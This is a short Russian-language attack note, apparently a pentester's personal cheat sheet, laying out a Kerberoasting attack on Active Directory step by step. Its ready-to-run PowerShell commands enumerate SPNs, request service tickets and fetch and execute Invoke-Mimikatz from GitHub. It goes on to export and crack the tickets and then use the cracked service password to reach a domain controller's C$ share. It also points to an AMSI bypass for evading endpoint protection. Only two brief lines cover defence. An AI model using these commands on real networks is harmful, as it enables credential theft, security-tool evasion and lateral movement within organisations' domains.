#AD #windows #attacks #privillage #kerberos

> [Kerberoasting](https://www.securitylab.ru/analytics/496049.php) – эффективный метод для извлечения служебных учетных записей из Active Directory от имени обычного пользователя и без отсылки пакетов в целевую систему

## Порядок действий 

1) Получение первоначального доступа
2) Командой _klist_ проверяем список доступных билетов
3) Ищем доступные SPNы различными инструментами или ps:
```powershell
setspn -T TestDomain -Q */*
```
4) Находим SPN учетной записи
5) Запрашиваем билеты, например ps:
```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSERVER/SQL-Server.testdomain.com:1433"
```
6) _klist_ убеждаемся, что TGS службы загружен в память
7) Mimikatz достаем его из памяти: (НО!) ЭТО ДЕТЕКТИТ EPP
Прочитать, например: [AMSI Bypass With a Null Character](http://standa-note.blogspot.com/2018/02/amsi-bypass-with-null-character.html?utm_source=Securitylab.ru).
```powershell
Invoke-Expression (New-Object Net.Webclient).downloadstring('[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps...](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1?utm_source=Securitylab.ru)')
```

8) Делаем выгрузку билетов на диск
```powershell
Invoke-Mimikatz –Command '" kerberos::list"' /export
```
9) После отправки на локальную машину начинаем брутить 
```powershell
python tgsrepcrack.py wordlist.txt 1-40a10000-Bob@MSSQLSERVER~SQL-Server.testdomain.com~1433-TESTDOMAIN.COM.kirbi
```
10) Взломав пароль просматриваем права
```powershell
net user SQLSVC /domain
```
11) Подключение за пользователя
```powershell
net group "Domain Controllers" /domain

net use \\WIN-4QHPFSI8002\c$ /user:SQLSVC Password123

dir \\WIN-4QHPFSI8002\c$
```

## Защита от атаки

1) Использование сложного пароля!!!
2) Конфигурация УЗ без привилегий